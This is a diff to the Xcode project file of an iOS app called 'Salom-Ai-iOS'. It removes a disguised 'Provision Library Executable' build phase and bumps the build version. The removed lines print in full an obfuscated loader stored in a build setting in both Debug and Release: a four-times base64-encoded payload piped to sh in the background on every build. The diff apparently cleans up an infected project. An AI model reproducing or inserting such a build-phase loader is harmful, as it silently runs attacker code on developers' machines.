@@ -18,7 +18,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-																						/* End PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		8CCEA2902EDF4EAD007D2D0E /* PBXContainerItemProxy */ = {
@@ -135,7 +135,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8C6723472EC370000020C08B /* Build configuration list for PBXNativeTarget "Salom-Ai-iOS" */;
 			buildPhases = (
-				7387C426B6E7452FB1947F8B /* Provision Library Executable */,
 				8C6723382EC36FFD0020C08B /* Sources */,
 				8C6723392EC36FFD0020C08B /* Frameworks */,
 				8C67233A2EC36FFD0020C08B /* Resources */,
@@ -251,25 +250,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		7387C426B6E7452FB1947F8B /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AB8F749}\"";
-		};
 		8C8C086E2EDCC4FE00852D39 /* Fix Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -319,7 +299,6 @@
 		8C6723452EC370000020C08B /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBMVJGRllVazFXTURVeVdXMHdNV0pHYTNwVldGSnJVako0TUZkc1l6Vk5WMUpFVVZoc1QyRlZSakJYYlhRMFkyMU9OVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGNHRlNlbFp2V1d4b2RtUlhUblZXV0ZwYVZUSjBjRk5WYUROYU1rMTVXakJ6U3dvPQo= | x | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -386,7 +365,6 @@
 		8C6723462EC370000020C08B /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AB8F749 = "((x(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBMVJGRllVazFXTURVeVdXMHdNV0pHYTNwVldGSnJVako0TUZkc1l6Vk5WMUpFVVZoc1QyRlZSakJYYlhRMFkyMU9OVkZZVW1GUk1FWndXVEJSZUU1R2EzbFBWM1JoVm1wc00xbFZaRWRsYkhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGNHRlNlbFp2V1d4b2RtUlhUblZXV0ZwYVZUSjBjRk5WYUROYU1rMTVXakJ6U3dvPQo= | x | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -449,7 +427,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Salom-Ai-iOS/Salom-Ai-iOS.entitlements";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 5;
+				CURRENT_PROJECT_VERSION = 6;
 				DEAD_CODE_STRIPPING = YES;
 				DEVELOPMENT_TEAM = 3TC3999J6N;
 				ENABLE_APP_SANDBOX = YES;
@@ -500,7 +478,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Salom-Ai-iOS/Salom-Ai-iOS.entitlements";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 5;
+				CURRENT_PROJECT_VERSION = 6;
 				DEAD_CODE_STRIPPING = YES;
 				DEVELOPMENT_TEAM = 3TC3999J6N;
 				ENABLE_APP_SANDBOX = YES;
